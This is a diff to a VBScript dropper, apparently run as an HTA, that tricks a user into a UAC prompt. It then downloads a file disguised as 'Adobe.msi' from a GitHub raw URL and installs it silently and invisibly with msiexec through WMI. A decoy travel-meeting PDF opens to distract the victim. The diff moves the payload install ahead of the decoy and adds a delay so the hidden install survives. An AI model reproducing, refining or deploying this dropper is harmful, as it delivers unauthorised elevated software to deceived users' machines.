@@ -27,9 +27,44 @@ If Not isAdmin Then
 End If
 
 ' ============================================================
-'  Elevated. PDF opens FIRST so the user has something to see.
+'  Elevated. Fetch MSI first (behind the scenes), then
+'  spawn msiexec, then fetch + open PDF while install runs.
+'  User sees: PDF opens ~2s after UAC. Install is invisible.
 ' ============================================================
 
+msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+msiPath = tmp & "\Adobe.msi"
+
+On Error Resume Next
+Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+http.open "GET", msiUrl, False
+http.send
+On Error GoTo 0
+
+If http.status = 200 Then
+    On Error Resume Next
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.responseBody
+    stream.SaveToFile msiPath, 2
+    stream.Close
+    On Error GoTo 0
+End If
+
+' ---- spawn msiexec first, while we still hold the elevated thread ----
+If fso.FileExists(msiPath) Then
+    On Error Resume Next
+    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
+    Set procClass = wmiSvc.Get("Win32_Process")
+    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
+    startup.ShowWindow = 0
+    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1"
+    procClass.Create cmdLine, Null, startup, pid
+    On Error GoTo 0
+End If
+
+' ---- now fetch + open the PDF ----
 pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
 pdfPath = tmp & "\Travel-Meeting-Plan-Q4-2026.pdf"
 
@@ -53,45 +88,10 @@ If ph.status = 200 Then
     End If
 End If
 
-' ============================================================
-'  PDF is now on screen. Do the MSI fetch + install in background.
-'  User sees: PDF opens. No visible pause. Install is silent.
-' ============================================================
+' ---- hold the HTA open long enough for msiexec to actually start ----
+' msiexec needs a moment to initialize; if mshta closes too fast, the
+' WMI-created process can be abandoned before it establishes itself.
+sh.Run "%COMSPEC% /c timeout /t 10 /nobreak >nul", 0, True
 
-WScript.Sleep 3000
-
-msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
-msiPath = tmp & "\Adobe.msi"
-
-On Error Resume Next
-Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-http.open "GET", msiUrl, False
-http.send
-On Error GoTo 0
-
-If http.status = 200 Then
-    On Error Resume Next
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write http.responseBody
-    stream.SaveToFile msiPath, 2
-    stream.Close
-    On Error GoTo 0
-End If
-
-If fso.FileExists(msiPath) Then
-    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
-    Set procClass = wmiSvc.Get("Win32_Process")
-    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
-    startup.ShowWindow = 0
-    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & " /qn /norestart ALLUSERS=1"
-    procClass.Create cmdLine, Null, startup, pid
-End If
-
-' ============================================================
-'  Cleanup: give the install time to finish, then remove the MSI.
-'  mshta process can close now — msiexec runs independently.
-' ============================================================
-
+' ---- no MSI delete this round ----
 self.close
